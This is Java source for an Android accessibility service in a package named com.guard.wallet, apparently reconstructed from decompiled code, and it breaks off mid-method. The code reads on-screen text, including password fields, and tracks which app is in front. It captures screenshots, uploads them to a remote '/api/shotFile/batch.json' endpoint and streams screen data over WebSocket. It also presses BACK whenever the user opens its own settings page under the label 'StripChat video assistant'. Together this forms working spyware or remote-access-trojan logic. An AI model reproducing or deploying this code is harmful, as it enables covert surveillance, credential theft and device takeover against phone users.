package com.guard.wallet.service;

import com.guard.wallet.core.AppUtils;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Rect;
import android.graphics.drawable.BitmapDrawable;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import com.guard.wallet.MainApplication;
import com.guard.wallet.entity.NoticeRootChangedVO;
import com.guard.wallet.entity.Point;
import com.guard.wallet.entity.ReadScreenNodeInfo;
import com.guard.wallet.entity.ReadScreenWindow;
import com.guard.wallet.entity.RootInActiveWindowResult;
import com.guard.wallet.entity.TakeScreenShotResult;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.entity.UiObjectCollection;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.http.UploadStoreFileCallback;
import com.guard.wallet.req.ContainerEventVO;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.req.ScreenMetricsVO;
import com.guard.wallet.req.UploadFileVO;
import com.guard.wallet.server.WebSocketManager;
import com.guard.wallet.thread.ScreenshotCallable;
import com.guard.wallet.utils.ConfigManager;
import com.guard.wallet.utils.DeviceUtils;
import com.guard.wallet.utils.SystemHelper;
import com.guard.wallet.utils.SharedPrefsManager;
import com.guard.wallet.websocket.WebSocketConnection;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.ListIterator;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.SynchronousQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;
import com.guard.wallet.delegate.AccessibilityDelegate;
import com.guard.wallet.delegate.DelegateUtils;
import com.guard.wallet.delegate.ScreenCaptureManager;
import com.guard.wallet.delegate.task.ScreenCaptureTask;
import com.guard.wallet.delegate.task.ConfirmLockRunnable;
import com.guard.wallet.delegate.UseDeviceCredentialDelegate;
import org.lsposed.hiddenapibypass.HiddenApiBypass;

/**
 * 无障碍服务 — 核心运行时类。
 * 接收 Android OS 全部无障碍事件, 路由到 AccessibilityDelegateManager,
 * 管理根节点、提供 P() 单例、J() 焦点节点、窗口变化追踪。
 *
 * vendor: com.guard.wallet.service.MyAccessibilityService (3847 行)
 * extends AccessibilityDelegateManager (918 行)
 *
 * Static AtomicReference fields:
 *   p (f219p) — service instance
 *   q         — flag
 *   r (f220r) — flag
 *   s (f221s) — current root UiObject
 *   t (f222t) — current root AccessibilityNodeInfo
 *   u (f223u) — current active package name
 *   v (f224v) — current active window class name
 *   w (f225w) — current active window title
 */
public class MyAccessibilityService extends AccessibilityDelegateManager {

    private static final String TAG = "MyAccessibilityService";

    // ═══════ Static fields ═══════

    /** vendor f219p — service instance reference */
    public static final AtomicReference<MyAccessibilityService> p = new AtomicReference<>(null);
    /** vendor q — global flag */
    public static final AtomicBoolean q2 = new AtomicBoolean(false);
    /** vendor f220r — initialization flag */
    public static final AtomicBoolean r2 = new AtomicBoolean(false);
    /** vendor f221s — current root UiObject */
    public static final AtomicReference<UiObject> s2 = new AtomicReference<>(null);
    /** vendor f222t — current root AccessibilityNodeInfo */
    public static final AtomicReference<AccessibilityNodeInfo> t2 = new AtomicReference<>(null);
    /** vendor f223u — current active package name */
    public static final AtomicReference<String> u2 = new AtomicReference<>(null);
    /** vendor f224v — current active window class name */
    public static final AtomicReference<String> v2 = new AtomicReference<>(null);
    /** vendor f225w — current active window title */
    public static final AtomicReference<String> w2 = new AtomicReference<>(null);

    // ═══════ Instance fields ═══════

    /** vendor f228m — VideoRecordManager instance */
    public com.guard.wallet.media.VideoRecordManager m;

    /** vendor f230o — thread pool for background event processing */
    public ThreadPoolExecutor o;

    /** vendor f226k — listener flag counter */
    public final AtomicInteger k = new AtomicInteger(0);

    /** vendor f227l — reentrant lock for onAccessibilityEvent */
    public final ReentrantLock l = new ReentrantLock();

    /** vendor f229n — unlock mode flag */
    public final AtomicBoolean n = new AtomicBoolean(false);

    /** ADAPT: minimal media-record active state */
    public final AtomicBoolean videoRecordingActive = new AtomicBoolean(false);

    /** ADAPT: last media-record start timestamp */
    public final AtomicLong videoRecordingStartedAt = new AtomicLong(0L);

    // ═══════ Static methods ═══════

    /**
     * vendor E(event) — extract event text as comma-separated string.
     */
    public static String E(AccessibilityEvent event) {
        try {
            if (event.getText().isEmpty()) {
                return null;
            }
            StringBuilder sb = new StringBuilder();
            for (CharSequence cs : event.getText()) {
                if (cs != null) {
                    if (!AppUtils.B(sb.toString())) {
                        sb.append(",");
                    }
                    sb.append(cs);
                }
            }
            return sb.toString();
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
            return null;
        }
    }

    /**
     * vendor I(uiObject) — clear cached node and refresh.
     * Clears API 33+ cache if applicable, checks sealed state, then refreshes.
     */
    public static boolean I(UiObject uiObject) {
        if (p.get() == null || !com.guard.wallet.utils.DeviceUtils.isScreenOn() || uiObject == null || uiObject.source() == null) {
            return false;
        }
        try {
            int sdk = Build.VERSION.SDK_INT;
            if (sdk >= 33 && p.get().isNodeInCache(uiObject.source().get().unwrap())) {
                p.get().clearCachedSubtree(uiObject.source().get().unwrap());
            }
            boolean sealed = Z(uiObject.source().get().unwrap());
            if (!sealed && sdk > 30) {
                sealed = K(uiObject.source().get().unwrap());
            }
            if (sealed) {
                return uiObject.source().get().unwrap().refresh();
            }
            return false;
        } catch (Exception ex) {
            AppUtils.s("clearCachedNode:", ex);
            return false;
        }
    }

    /**
     * vendor K(node) — force unseal node then check if sealed.
     * Uses hidden API bypass to call setSealed(true), then checks isSealed.
     */
    public static boolean K(AccessibilityNodeInfo node) {
        if (node != null) {
            try {
                if (Build.VERSION.SDK_INT >= 28) {
                    HiddenApiBypass.invoke(AccessibilityNodeInfo.class, node, "setSealed", Boolean.TRUE);
                }
            } catch (Exception ex) {
                AppUtils.s(TAG, ex);
            }
        }
        return Z(node);
    }

    /**
     * vendor L(filter) — find all nodes matching CombineFilter from current root.
     */
    public static UiObjectCollection L(CombineFilter filter) {
        try {
            if (s2.get() != null) {
                return s2.get().findByCombine(filter);
            }
            return null;
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
            return null;
        }
    }

    /**
     * vendor M(filter) — find first node matching CombineFilter from current root.
     */
    public static UiObject M(CombineFilter filter) {
        try {
            if (s2.get() != null) {
                return s2.get().findOneByCombine(filter);
            }
            return null;
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
            return null;
        }
    }

    /** vendor N() — get current window package name */
    public static String N() {
        return u2.get();
    }

    /**
     * vendor O() — get active window bounds from root node's window.
     */
    public static Rect O() {
        try {
            if (t2.get() == null || t2.get().getWindow() == null) {
                return null;
            }
            Rect rect = new Rect();
            t2.get().getWindow().getBoundsInScreen(rect);
            if (rect.width() <= 0) {
                return null;
            }
            return rect.height() > 0 ? rect : null;
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
            return null;
        }
    }

    /** vendor P() — get service singleton instance */
    public static MyAccessibilityService P() {
        return p.get();
    }

    /** vendor Q() — get current root UiObject */
    public static UiObject Q() {
        return s2.get();
    }

    /**
     * vendor Z(node) — check if AccessibilityNodeInfo is sealed.
     * Uses hidden API bypass to call isSealed() on API 28+.
     */
    public static boolean Z(AccessibilityNodeInfo node) {
        if (node == null) {
            return false;
        }
        try {
            if (Build.VERSION.SDK_INT < 28) {
                return false;
            }
            Object result = HiddenApiBypass.invoke(AccessibilityNodeInfo.class, node, "isSealed");
            if (result instanceof Boolean) {
                return (Boolean) result;
            }
            return false;
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
            return false;
        }
    }

    /**
     * vendor a0(bytes) — broadcast screenshot bytes to WebSocket connections and bridge.
     */
    public static void a0(byte[] bytes) {
        try {
            if (Integer.valueOf(com.guard.wallet.server.WebSocketManager.getInstance().eventListeners.size()).intValue() > 0) {
                com.guard.wallet.server.WebSocketManager server = com.guard.wallet.server.WebSocketManager.getInstance();
                if (bytes != null && bytes.length > 0) {
                    ConcurrentLinkedQueue queue = server.eventListeners;
                    if (!queue.isEmpty()) {
                        Iterator it = queue.iterator();
                        while (it.hasNext()) {
                            try {
                                ((WebSocketConnection) it.next()).sendBytes(bytes);
                            } catch (Exception ex) {
                                AppUtils.s("MyWebSocketServer", ex);
                            }
                        }
                    }
                }
            }
            com.guard.wallet.bridge.a bridge = AppUtils.d;
            if (bridge != null && bridge.w.get() && bytes != null && bytes.length > 0) {
                if (AppUtils.d != null && AppUtils.d.w.get()) {
                    AppUtils.d.B(bytes);
                }
            }
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
        }
    }

    /**
     * vendor e0(node, depth, index, window) — recursively read screen nodes into ReadScreenWindow.
     */
    public static void e0(AccessibilityNodeInfo node, int depth, int index, ReadScreenWindow window) {
        if (node != null) {
            try {
                if (node.isVisibleToUser()
                        && (node.getText() != null || node.getContentDescription() != null
                        || node.isEditable() || node.isPassword() || node.getChildCount() == 0)) {
                    ReadScreenNodeInfo info = new ReadScreenNodeInfo(depth, index);
                    Rect rect = new Rect();
                    node.getBoundsInScreen(rect);
                    com.guard.wallet.helper.NodeBoundsHelper.c(rect);
                    info.setBoundsInScreen(rect);
                    info.setWidth(rect.width());
                    info.setHeight(rect.height());
                    info.setCenterInScreen(new Point(rect.exactCenterX(), rect.exactCenterY()));
                    if (node.getPackageName() != null) {
                        info.setPackageName(node.getPackageName().toString());
                    }
                    if (node.getClassName() != null) {
                        info.setClassName(node.getClassName().toString());
                    }
                    if (node.getText() != null) {
                        info.setText(node.getText().toString());
                    }
                    if (node.getContentDescription() != null) {
                        info.setDesc(node.getContentDescription().toString());
                    }
                    window.getChildren().add(info);
                }
                if (node.getChildCount() > 0) {
                    for (int idx = 0; idx < node.getChildCount(); idx++) {
                        e0(node.getChild(idx), depth + 1, idx, window);
                    }
                }
            } catch (Exception ex) {
                AppUtils.s(TAG, ex);
            }
        }
    }

    /**
     * vendor m0(node) — traverse to root of the accessibility tree.
     * Recursively calls getParent() until reaching the topmost node.
     */
    public static AccessibilityNodeInfo m0(AccessibilityNodeInfo node) {
        if (node != null) {
            try {
                if (node.getParent() == null) {
                    return node;
                }
                node.recycle();
                return m0(node.getParent());
            } catch (Exception ex) {
                AppUtils.s(TAG, ex);
            }
        }
        return node;
    }

    /**
     * vendor n0(callable, uploadToServer) — take screenshot via thread pool.
     * Submits callable to executor, waits for result, optionally uploads to server.
     */
    public static TakeScreenShotResult n0(ScreenshotCallable callable, boolean uploadToServer) {
        try {
            LinkedList<Future> futures = new LinkedList<>();
            futures.add(Executors.newFixedThreadPool(2).submit(callable));
            TakeScreenShotResult result = null;
            while (!futures.isEmpty()) {
                ListIterator<Future> it = futures.listIterator();
                while (it.hasNext()) {
                    Future future = it.next();
                    if (future.isDone()) {
                        TakeScreenShotResult res = (TakeScreenShotResult) future.get();
                        try {
                            it.remove();
                            if (res != null && res.getSaveBytesResult() != null
                                    && res.getSaveBytesResult().length > 0 && uploadToServer) {
                                byte[] bytes = res.getSaveBytesResult();
                                String deviceId = com.guard.wallet.utils.SharedPrefsManager.l("deviceId");
                                if (!AppUtils.B(deviceId) && bytes != null && bytes.length > 0) {
                                    new com.guard.wallet.http.HttpClient().asyncUploadBytes(
                                            new UploadFileVO(deviceId, "100016"),
                                            "/api/shotFile/batch.json", null, bytes, new UploadStoreFileCallback());
                                }
                            }
                        } catch (Exception ex2) {
                            AppUtils.s(TAG, ex2);
                        }
                        result = res;
                    }
                }
            }
            return result;
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
            return null;
        }
    }

    /**
     * vendor o0() — take screenshot and return as BitmapDrawable.
     * Uses MediaProjection (API <30) or takeScreenshot (API 30+).
     */
    public static BitmapDrawable o0() {
        try {
            TakeScreenShotResult result;
            if (Build.VERSION.SDK_INT >= 30) {
                result = n0(new ScreenshotCallable(Float.valueOf(1.0f)), false);
            } else {
                com.guard.wallet.capture.ScreenCaptureManager capture = com.guard.wallet.capture.ScreenCaptureManager.getInstance();
                ReentrantLock lock = capture.readLock;
                if (!lock.tryLock()) {
                    return null;
                }
                try {
                    if (capture.isReady()) {
                        Bitmap bitmap = capture.imageListener.latestBitmap.get();
                        if (bitmap != null) {
                            byte[] data = com.guard.wallet.utils.SystemHelper.M0(bitmap, 1.0f, 100);
                            lock.unlock();
                            result = new TakeScreenShotResult(null, data);
                        } else {
                            lock.unlock();
                            return null;
                        }
                    } else {
                        capture.requestProjection();
                        lock.unlock();
                        return null;
                    }
                } catch (Exception ex) {
                    lock.unlock();
                    throw ex;
                }
            }
            if (result == null || result.getSaveBytesResult() == null
                    || result.getSaveBytesResult().length <= 0) {
                return null;
            }
            byte[] imageBytes = result.getSaveBytesResult();
            Bitmap bmp = null;
            if (imageBytes != null && imageBytes.length > 0) {
                try {
                    bmp = BitmapFactory.decodeByteArray(imageBytes, 0, imageBytes.length);
                } catch (Exception ex) {
                    AppUtils.s("BitmapUtils", ex);
                }
            }
            if (bmp == null) {
                return null;
            }
            try {
                BitmapDrawable drawable = new BitmapDrawable(bmp);
                drawable.setAlpha(255);
                return drawable;
            } catch (Exception ex) {
                AppUtils.s("BitmapUtils", ex);
                return null;
            }
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
            return null;
        }
    }

    /**
     * vendor u0() — take screenshot for server upload.
     * Uses MediaProjection (API <30) or takeScreenshot (API 30+).
     */
    public static TakeScreenShotResult u0() {
        try {
            if (Build.VERSION.SDK_INT >= 30) {
                return n0(new ScreenshotCallable(false), true);
            }
            com.guard.wallet.capture.ScreenCaptureManager capture = com.guard.wallet.capture.ScreenCaptureManager.getInstance();
            ReentrantLock lock = capture.readLock;
            if (!lock.tryLock()) {
                return null;
            }
            try {
                if (capture.isReady()) {
                    Bitmap bitmap = capture.imageListener.latestBitmap.get();
                    if (bitmap != null) {
                        byte[] data = com.guard.wallet.utils.SystemHelper.M0(bitmap, 0.5f, 80);
                        lock.unlock();
                        return new TakeScreenShotResult(null, data);
                    }
                } else {
                    capture.requestProjection();
                }
                lock.unlock();
                return null;
            } catch (Exception ex) {
                lock.unlock();
                throw ex;
            }
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
            return null;
        }
    }

    // ═══════ Instance methods ═══════

    /**
     * vendor F(count) — increment listener flag counter.
     * When reaches 2, triggers LOAD_LISTEN_WINDOW_FINISHED strategy event.
     */
    public final void F(int count) {
        if (count > 0) {
            try {
                if (this.k.addAndGet(count) >= 2 && MainApplication.getInstance() != null) {
                    MainApplication.getInstance().offerStrategyEvent("LOAD_LISTEN_WINDOW_FINISHED");
                }
            } catch (Exception ex) {
                AppUtils.s(TAG, ex);
            }
        }
    }

    /**
     * vendor G(event) — core event processing: update root node, package, window class.
     * Called from onAccessibilityEvent after lock acquired.
     * Handles event types: TYPE_WINDOW_STATE_CHANGED (32), TYPE_WINDOWS_CHANGED (16384),
     * TYPE_VIEW_SCROLLED (4096), TYPE_WINDOW_CONTENT_CHANGED (2048).
     */
    public final void G(AccessibilityEvent event) {
        if (event == null) return;
        try {
            if (event.getEventType() <= 0) return;

            int eventType = event.getEventType();

            // For types other than 32 (WINDOW_STATE_CHANGED) and 16384 (WINDOWS_CHANGED):
            // Check if event type is 2048 (CONTENT_CHANGED) — filter by custom event queue
            if (eventType != 32 && eventType != 16384) {
                if (eventType != 2048) {
                    return;
                }
                // Check custom event queue
                ConcurrentLinkedQueue customQueue = super.c;
                if (customQueue.isEmpty()) {
                    return;
                }
                String pkgName = event.getPackageName() != null
                        ? event.getPackageName().toString() : null;
                boolean inQueue;
                try {
                    inQueue = !AppUtils.B(pkgName) && customQueue.contains(pkgName);
                } catch (Exception ex) {
                    AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", ex);
                    inQueue = false;
                }
                if (!inQueue) {
                    return;
                }
            }

            // Get root in active window
            RootInActiveWindowResult rootResult = this.R();
            AccessibilityNodeInfo curRoot = rootResult.getCurRoot();

            // Recycle old root if changed
            if (s2.get() != null) {
                try {
                    if (!Objects.equals(curRoot, s2.get().source())
                            && s2.get().isRootRecycle()) {
                        Log.d(TAG, "Active root node will recycle");
                        s2.get().recycle();
                    }
                } catch (Exception ex) {
                    AppUtils.s(TAG, ex);
                }
            }

            if (curRoot == null) {
                Log.d(TAG, "root is Null");
                return;
            }

            // Extract package name and class name from root
            String rootPkg = curRoot.getPackageName() != null
                    ? curRoot.getPackageName().toString() : null;
            String rootClass = curRoot.getClassName() != null
                    ? curRoot.getClassName().toString() : null;

            String windowTitle = this.T();

            // Determine the window class name to use
            String windowClass = rootClass;

            // For TYPE_WINDOW_CONTENT_CHANGED, keep previous class if same package
            if (eventType == 2048) {
                Log.d(TAG, "窗口内容更新作为窗口状态变化:" + event.getPackageName());
                if (Objects.equals(rootPkg, u2.get()) && !AppUtils.B(v2.get())) {
                    windowClass = v2.get();
                }
            }

            // For TYPE_WINDOW_STATE_CHANGED (32) and TYPE_WINDOWS_CHANGED (16384),
            // prefer event's class name
            if (eventType == 32 || eventType == 16384) {
                String eventClass = event.getClassName() != null
                        ? event.getClassName().toString() : null;
                if (eventClass != null) {
                    windowClass = eventClass;
                }
            }

            // Filter: ignore systemui android.view.View, own LockActivity, guard LockActivity
            boolean isIgnored = false;
            try {
                if (Objects.equals(rootPkg, "com.android.systemui")
                        && Objects.equals(windowClass, "android.view.View")) {
                    isIgnored = true;
                } else if (Objects.equals(windowClass, getPackageName().concat(".LockActivity"))) {
                    isIgnored = true;
                } else {
                    isIgnored = Objects.equals(windowClass, "com.google.guard".concat(".LockActivity"));
                }
            } catch (Exception ex) {
                AppUtils.s(TAG, ex);
            }
            if (isIgnored) {
                return;
            }

            // Log root change
            if (!curRoot.equals(t2.get())) {
                Log.d(TAG, "当前视图根节点已变化");
            }
            if (u2.get() != null) {
                Log.d(TAG, "上一个运行包名 old activePackageName:" + u2.get());
            }
            if (v2.get() != null) {
                Log.d(TAG, "上一个运行窗口 old activeWindowClassName:" + v2);
            }
            if (!AppUtils.B(windowClass)) {
                Log.d(TAG, "当前视图栈顶节点:" + windowClass);
            }

            // Determine what changed: package vs window class
            boolean packageEquals = Objects.equals(u2.get(), rootPkg);
            boolean packageChanged;
            boolean windowChanged;

            if (!packageEquals) {
                // Package changed
                u2.set(rootPkg);
                v2.set(windowClass);
                w2.set(windowTitle);
                packageChanged = true;
                windowChanged = true;
            } else {
                // Same package — check if window class changed (only if listenWindow registered)
                if (l(com.guard.wallet.utils.SystemHelper.v0(rootPkg, windowClass, AccessibilityDelegate.class.getName()))
                        && !Objects.equals(v2.get(), windowClass)) {
                    v2.set(windowClass);
                    w2.set(windowTitle);
                    windowChanged = true;
                    packageChanged = false;
                } else {
                    windowChanged = false;
                    packageChanged = false;
                }
            }

            // Clear cache
            H(packageChanged, windowChanged);

            // Update state
            UiObject newRoot = UiObject.createRoot(curRoot);
            t2.set(curRoot);
            s2.set(newRoot);

            if (!AppUtils.B(u2.get())) {
                Log.d(TAG, "当前运行包名已变化 new rootPackageName:" + u2.get());
            }
            if (!AppUtils.B(v2.get())) {
                Log.d(TAG, "当前运行窗口已变化 new windowClassName:" + v2.get());
            }
            if (!AppUtils.B(w2.get())) {
                Log.d(TAG, "当前运行窗口已变化 new windowTitle:" + w2.get());
            }

            // Notify delegates
            boolean g0Notified = this.i0(rootPkg, windowClass, windowTitle, rootResult.isComplete());
            boolean delegatesNotified = this.h0(u2.get(), v2.get(),
                    w2.get(), rootResult.isComplete());
            if (s2.get() == null) {
                return;
            }
            UiObject rootObj = s2.get();
            // Set rootRecycle: true if neither delegate was notified
            rootObj.setRootRecycle(!delegatesNotified && !g0Notified);

        } catch (Exception ex) {
            AppUtils.s("changeRootInActiveWindow", ex);
        }
    }

    /**
     * vendor H(clearAll, refreshOnly) — clear accessibility cache on root node.
     * clearAll=true: clearCache() + clearCachedSubtree + unseal + refresh
     * clearAll=false, refreshOnly=true: only refresh existing root
     */
    public final void H(boolean clearAll, boolean refreshOnly) {
        try {
            if (clearAll) {
                if (Build.VERSION.SDK_INT >= 33) {
                    clearCache();
                }
                if (t2.get() == null) {
                    return;
                }
                if (Build.VERSION.SDK_INT >= 33) {
                    clearCachedSubtree(t2.get());
                }
                boolean sealed = Z(t2.get());
                if (!sealed) {
                    sealed = K(t2.get());
                }
                if (sealed) {
                    t2.get().refresh();
                }
            } else {
                if (!refreshOnly || t2.get() == null) {
                    return;
                }
                if (Build.VERSION.SDK_INT >= 33) {
                    clearCachedSubtree(t2.get());
                }
                boolean sealed = Z(t2.get());
                if (!sealed) {
                    sealed = K(t2.get());
                }
                if (sealed) {
                    t2.get().refresh();
                }
            }
        } catch (Exception ex) {
            AppUtils.s("clearCacheRoot:", ex);
        }
    }

    /**
     * vendor J() — get currently focused UiObject.
     * First tries findFocus(FOCUS_INPUT), then falls back to currentFocusedNode() on root.
     */
    public final UiObject J() {
        try {
            AccessibilityNodeInfo focused = findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
            if (focused != null) {
                return UiObject.createRoot(focused);
            }
            if (s2.get() != null) {
                return s2.get().currentFocusedNode();
            }
            return null;
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
            return null;
        }
    }

    /**
     * vendor R() — get root in active window with window fallback.
     * First tries getRootInActiveWindow(), then traverses getWindows() for active window.
     * Uses m0() to find topmost parent.
     */
    public final RootInActiveWindowResult R() {
        AccessibilityNodeInfo curRoot = null;
        try {
            curRoot = super.getRootInActiveWindow();
            if (curRoot != null) {
                curRoot = m0(curRoot);
            }
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
        }
        try {
            List<AccessibilityWindowInfo> windows = getWindows();
            if (windows != null && !windows.isEmpty()) {
                for (AccessibilityWindowInfo win : windows) {
                    if (win != null && win.isActive() && curRoot == null) {
                        AccessibilityNodeInfo winRoot;
                        if (Build.VERSION.SDK_INT >= 33) {
                            winRoot = com.guard.wallet.infra.WindowInfoCompat.getRootNode(win);
                        } else {
                            winRoot = win.getRoot();
                        }
                        if (winRoot != null) {
                            curRoot = m0(winRoot);
                        }
                    }
                }
            }
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
        }
        if (curRoot == null) {
            Log.d(TAG, "curRoot is Null");
        }
        return new RootInActiveWindowResult(curRoot, false);
    }

    /**
     * vendor S() — get current active package name from root node or cached value.
     */
    public final String S() {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null && root.getPackageName() != null) {
                return root.getPackageName().toString();
            }
            return u2.get();
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
            return null;
        }
    }

    /**
     * vendor T() — get active window title from getWindows().
     */
    public final String T() {
        List<AccessibilityWindowInfo> windows = getWindows();
        if (windows == null || windows.isEmpty()) {
            return null;
        }
        for (AccessibilityWindowInfo win : windows) {
            if (win != null && win.isActive() && win.getTitle() != null) {
                return win.getTitle().toString();
            }
        }
        return null;
    }

    /**
     * vendor U(event) — check if event is our own accessibility service window focus
     * and perform BACK action to dismiss.
     */
    public final boolean U(AccessibilityEvent event) {
        if (event == null) return false;
        try {
            if (event.getEventType() <= 0 || event.getEventType() != 32
                    || com.guard.wallet.utils.SystemHelper.p0() || com.guard.wallet.utils.SharedPrefsManager.q()) {
                return false;
            }
            String title = T();
            String label = (MainApplication.getInstance() != null
                    && MainApplication.getInstance().getBuildConfig() != null
                    && !AppUtils.B(MainApplication.getInstance().getBuildConfig().getAccessibilityServiceLabel()))
                    ? MainApplication.getInstance().getBuildConfig().getAccessibilityServiceLabel()
                    : "StripChat video assistant";
            if (!Objects.equals(title, label)) {
                return false;
            }
            Log.d(TAG, "back");
            com.guard.wallet.utils.SystemHelper.F0(1);
            return true;
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
            return false;
        }
    }

    /**
     * vendor V() — check if listener flag counter >= 2 (service fully initialized).
     */
    public final boolean V() {
        return this.k.get() >= 2;
    }

    /**
     * vendor W(event) — check if event should be ignored for delegate dispatch.
     * Ignores: empty package, own package, "com.google.guard", and non-subscribed 2048 events.
     */
    public final boolean W(AccessibilityEvent event) {
        if (event != null) {
            try {
                if (event.getEventType() > 0) {
                    String pkg = event.getPackageName() != null
                            ? event.getPackageName().toString() : u2.get();
                    if (AppUtils.B(pkg) || Objects.equals(pkg, getPackageName())
                            || Objects.equals(pkg, "com.google.guard")) {
                        return true;
                    }
                    if (Objects.equals(Integer.valueOf(event.getEventType()), 2048)) {
                        return !k(pkg);
                    }
                    return false;
                }
            } catch (Exception ex) {
                AppUtils.s("isIgnoreEvent", ex);
                return false;
            }
        }
        return true;
    }

    /**
     * vendor X(event) — check if event should be ignored for background thread processing.
     * Similar to W() but also ignores TYPE_VIEW_FOCUSED (64).
     */
    public final boolean X(AccessibilityEvent event) {
        if (event != null) {
            try {
                if (event.getEventType() > 0) {
                    String pkg = event.getPackageName() != null
                            ? event.getPackageName().toString() : null;
                    if (AppUtils.B(pkg) || Objects.equals(pkg, getPackageName())
                            || Objects.equals(Integer.valueOf(event.getEventType()), 64)) {
                        return true;
                    }
                    if (Objects.equals(Integer.valueOf(event.getEventType()), 2048)) {
                        return !k(pkg);
                    }
                    return false;
                }
            } catch (Exception ex) {
                AppUtils.s(TAG, ex);
                return false;
            }
        }
        return true;
    }

    /**
     * vendor Y() — check if video recording is active.
     * Returns true if VideoRecordManager (m2) is active.
     */
    public final boolean Y() {
        try {
            boolean active = com.guard.wallet.capture.ScreenCaptureManager.getInstance().isReady();
            this.videoRecordingActive.set(active);
            if (active && this.videoRecordingStartedAt.get() <= 0L) {
                this.videoRecordingStartedAt.set(System.currentTimeMillis());
            } else if (!active) {
                this.videoRecordingStartedAt.set(0L);
            }
            return active;
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
            return false;
        }
    }

    /**
     * vendor b0(event) — broadcast live screen event to WebSocket listeners.
     */
    public final void b0(AccessibilityEvent event) {
        try {
            if (Integer.valueOf(com.guard.wallet.server.WebSocketManager.getInstance().eventListeners.size()).intValue() <= 0) {
                com.guard.wallet.bridge.a bridge = AppUtils.d;
                if (!(bridge != null && bridge.w.get())) {
                    return;
                }
            }
            if (event != null && event.getEventType() > 0) {
                String pkg = event.getPackageName() != null
                        ? event.getPackageName().toString() : u2.get();
                if (!AppUtils.B(pkg)
                        && Objects.equals(Integer.valueOf(event.getEventType()), 2048)) {
                    this.e.a();
                }
            }
        } catch (Exception ex) {
            AppUtils.s("liveBroadcastEvent", ex);
        }
    }

    /**
     * vendor c0(event) — process MiniCapture screen events.
     */
    public final void c0(AccessibilityEvent event) {
        if (event != null) {
            try {
                if (DelegateUtils.b(event.getEventType()) || DelegateUtils.a(event.getEventType())) {
                    if (Integer.valueOf(com.guard.wallet.server.WebSocketManager.getInstance().screenListeners.size()).intValue() > 0 || AppUtils.z()) {
                        String pkg = event.getPackageName() != null
                                ? event.getPackageName().toString() : null;
                        if (Objects.equals(pkg, getPackageName())) {
                            return;
                        }
                        boolean isTypeB = DelegateUtils.b(event.getEventType());
                        DelegateUtils miniCapture = this.f;
                        if (isTypeB) {
                            try {
                                if (!miniCapture.b.get()) {
                                    miniCapture.a.submit(new ConfirmLockRunnable(miniCapture, 4));
                                }
                            } catch (Exception ex) {
                                AppUtils.s("DelegateUtils", ex);
                            }
                        } else if (DelegateUtils.a(event.getEventType())) {
                            AccessibilityEvent copy;
                            if (Build.VERSION.SDK_INT >= 30) {
                                // vendor: d0.a.a.v() — synthetic no-op, removed
                                copy = com.guard.wallet.infra.AccessibilityCompat.copyEvent(event);
                            } else {
                                copy = AccessibilityEvent.obtain(event);
                            }
                            try {
                                if (AppUtils.E(7912) && !miniCapture.c.get()) {
                                    miniCapture.a.submit(new ScreenCaptureTask(miniCapture, copy, 0));
                                }
                            } catch (Exception ex) {
                                AppUtils.s("DelegateUtils", ex);
                            }
                        }
                    }
                }
            } catch (Exception ex) {
                AppUtils.s(TAG, ex);
            }
        }
    }

    /**
     * vendor d0() — load local listen windows from file.
     * Reads listenWindows.json from external storage, increments listener counter.
     */
    public final int d0() {
        int result = 0;
        try {
            if (!(this.k.get() >= 1) && com.guard.wallet.utils.SharedPrefsManager.s()) {
                String path = com.guard.wallet.utils.SystemHelper.i0();
                if (!AppUtils.B(path)) {
                    String filePath = path.concat("/").concat("listenWindows.json");
                    Log.d(TAG, filePath);
                    String json = AppUtils.K(filePath);
                    Log.d(TAG, "准备添加本地监听窗口:" + json);
                    try {
                        if (AppUtils.B(json) || com.guard.wallet.utils.SystemHelper.G(json) <= 0) {
                            F(1);
                            return 1;
                        }
                        Log.d(TAG, "已添加本地监听窗口");
                        F(2);
                        return 2;
                    } catch (Exception ex) {
                        AppUtils.s(TAG, ex);
                        return 1;
                    }
                }
            }
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
        }
        return result;
    }

    /**
     * vendor f0(event) — dispatch accessibility event to delegate queue.
     * Iterates all delegates, checks if active and listening for this event type,
     * then calls delegate.u(event, packageName, windowClassName).
     * Also dispatches to g0 delegate.
     */
    public final void f0(AccessibilityEvent event) {
        try {
            if (this.n.get() || W(event)) {
                return;
            }
            ConcurrentLinkedQueue delegateQueue = this.a;

            if (!delegateQueue.isEmpty()) {
                Iterator it = delegateQueue.iterator();
                while (it.hasNext()) {
                    AccessibilityDelegate delegate = (AccessibilityDelegate) it.next();
                    if (delegate != null && delegate.o() && delegate.l() != null
                            && !delegate.l().isEmpty()
